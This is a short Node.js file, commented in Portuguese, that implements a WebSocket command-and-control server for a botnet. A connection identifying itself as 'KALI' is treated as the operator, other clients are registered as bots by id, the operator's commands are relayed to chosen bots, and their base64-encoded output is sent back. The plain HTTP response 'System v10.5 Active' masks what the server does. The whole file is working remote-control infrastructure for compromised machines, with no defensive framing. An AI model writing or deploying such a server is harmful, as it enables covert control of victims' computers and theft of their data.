const WebSocket = require('ws');
const server = require('http').createServer((req, res) => res.end('System v10.5 Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (id === 'KALI') {
        KALI = ws;
        console.log('[!] Operador autenticado.');
    } else if (id) {
        BOTS.set(id, ws);
        if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({t:'bot', s:'on', id}));
    }

    ws.on('message', m => {
        if (ws === KALI) {
            try {
                const d = JSON.parse(m);
                const target = BOTS.get(d.to);
                if (target) target.send(d.cmd);
            } catch(e) {}
        } else if (KALI?.readyState === WebSocket.OPEN) {
            // Encaminha a resposta bruta (base64) para o Kali
            KALI.send(JSON.stringify({t:'res', f:id, d:m.toString()}));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) KALI = null;
        else { BOTS.delete(id); if (KALI) KALI.send(JSON.stringify({t:'bot', s:'off', id})); }
    });
});
server.listen(process.env.PORT || 10000);
